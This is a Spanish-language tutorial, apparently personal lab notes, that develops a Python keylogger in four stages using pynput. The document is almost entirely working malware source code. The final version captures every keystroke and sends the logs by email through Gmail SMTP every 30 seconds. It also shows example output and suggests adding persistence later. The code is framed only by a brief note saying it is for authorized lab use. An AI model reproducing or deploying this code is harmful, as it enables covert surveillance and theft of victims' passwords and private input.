
---

# PoC Tutorial — Evolución de un Keylogger en Python (`pynput`)

**Resumen**  
Este documento muestra la **evolución progresiva** de un keylogger escrito en Python, usando la librería `pynput` para capturar pulsaciones. Se parte de un prototipo mínimo y se va avanzando hacia un sistema modular, con control de apagado, y finalmente con envío periódico de logs por correo electrónico.

**Requisito específico:** Para ejecutar `pynput` en un entorno controlado es recomendable usar un **entorno virtual de Python**. Por ejemplo:

```bash

python3 -m venv venv source venv/bin/activate

```

De esta forma aíslas dependencias y evitas conflictos con librerías del sistema.

---

## Índice

1. Versión 1 — Script mínimo (prototipo)
    
2. Versión 2 — Refactorización en clase + `main.py`
    
3. Versión 3 — Shutdown ordenado con señal SIGINT
    
4. Versión 4 — Envío de logs por email (PoC completo)
    
5. Ejecución y salida de ejemplo
    
6. Consideraciones de seguridad y ocultación
    
7. Posibles mejoras futuras
    

---

## 1) Versión 1 — Script mínimo (prototipo)

**Archivo:** `keylogger_v1.py`

```python
#!/usr/bin/env python3
import pynput.keyboard
import threading

log = ""

def pressed_key(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
        log += special_keys.get(key, f" {str(key)} ")
    print(log)

def report():
    global log
    log = ""
    timer = threading.Timer(5, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=pressed_key)
with keyboard_listener:
    report()
    keyboard_listener.join()
```

### Aporta

- Captura teclas y las imprime en consola.
    
- Reinicia el buffer cada 5s.
    

### Limitaciones

- Uso de variables globales.
    
- No guarda logs en ningún sitio.
    
- Sin mecanismo de salida ordenada.
    

---

## 2) Versión 2 — Refactorización en clase + `main.py`

**Archivo:** `keylogger_v2.py`

```python
#!/usr/bin/env python3
import pynput.keyboard
import threading

class Keylogger:
    def __init__(self):
        self.log = ""

    def pressed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
            self.log += special_keys.get(key, f" {str(key)} ")
        print(self.log)

    def report(self):
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
```

**Archivo:** `main.py`

```python
#!/usr/bin/env python3
from keylogger_v2 import Keylogger

if __name__ == '__main__':
    my_keylogger = Keylogger()
    my_keylogger.start()
```

### Aporta

- Encapsula la lógica en la clase `Keylogger`.
    
- Mejora la organización del código.
    

### Limitaciones

- Todavía no hay forma de detener `threading.Timer`.
    
- Sin manejo de señales.
    

---

## 3) Versión 3 — Shutdown ordenado con señal SIGINT

**Archivo:** `keylogger_v3.py`

```python
#!/usr/bin/env python3
import pynput.keyboard
import threading

class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None

    def pressed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
            self.log += special_keys.get(key, f" {str(key)} ")
        print(self.log)

    def report(self):
        self.log = ""
        if not self.request_shutdown:
            self.timer = threading.Timer(5, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
```

**Archivo:** `main.py`

```python
#!/usr/bin/env python3
from keylogger_v3 import Keylogger
from termcolor import colored
import signal, sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    my_keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    my_keylogger = Keylogger()
    my_keylogger.start()
```

### Aporta

- Control del temporizador (`self.timer`).
    
- Método `shutdown()` que cancela ejecución limpia.
    
- Integración con `SIGINT` (Ctrl+C).
    

---

## 4) Versión 4 — Envío de logs por email (PoC completo)

**Archivo:** `keylogger_v4.py`

> **Nota:** se han **redactado datos sensibles** (email y contraseña de aplicación). [Ver Cómo obtener una contraseña de aplicación](../Keylogger/Cómo€26obtener€26una€26contraseña€26de€26aplicación.md)

```python
#!/usr/bin/env python3
import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
            self.log += special_keys.get(key, f" {str(key)} ")
        print(self.log)

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
           smtp_server.login(sender, password)
           smtp_server.sendmail(sender, recipients, msg.as_string())
        print(f"\n¡Mensaje enviado!\n")

    def report(self):
        email_body = "[+] El Keylogger se ha iniciado" if self.is_first_run else self.log
        self.send_email(
            "Keylogger_report",
            email_body,
            "[REDACTED_EMAIL]",
            ["[REDACTED_EMAIL]"],
            "[REDACTED_PASSWORD]"
        )
        self.log = ""
        if self.is_first_run:
            self.is_first_run = False
        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
```

**Archivo:** `main.py`

```python
#!/usr/bin/env python3
from keylogger_v4 import Keylogger
from termcolor import colored
import signal, sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    my_keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    my_keylogger = Keylogger()
    my_keylogger.start()
```

### Aporta

- Envío automático de logs vía SMTP cada 30s.
    
- Primer envío incluye mensaje de inicio.
    
- Control de timers y shutdown.
    

---

## 5) Ejecución y salida de ejemplo

```bash
python3 main.py
```

**Salida esperada en consola:**

```
abc
abc Shift 
abc Shift d
¡Mensaje enviado!

[!] Saliendo...
```

**En el correo configurado:**

- Primer email → `[+] El Keylogger se ha iniciado`.
    
- Emails posteriores → logs acumulados del teclado cada 30s.
    

---

## 6) Consideraciones de seguridad y ocultación

- **Legal:** este PoC debe usarse solo en entornos de laboratorio y con autorización.
    
- **Ocultación:** en el código se han reemplazado las credenciales (`[REDACTED]`). Nunca guardes contraseñas en claro en el código.
    
- **SMTP seguro:** usa contraseñas de aplicación, nunca tu clave principal.
    

---

## 7) Posibles mejoras futuras

- Guardar logs en ficheros cifrados en lugar de enviarlos.
    
- Configurar email, intervalo y destinatarios vía `argparse`.
    
- Añadir persistencia opcional para reinicios (solo en laboratorio).
    
- Filtrado/redacción de entradas sensibles (p.ej. contraseñas).
    

---
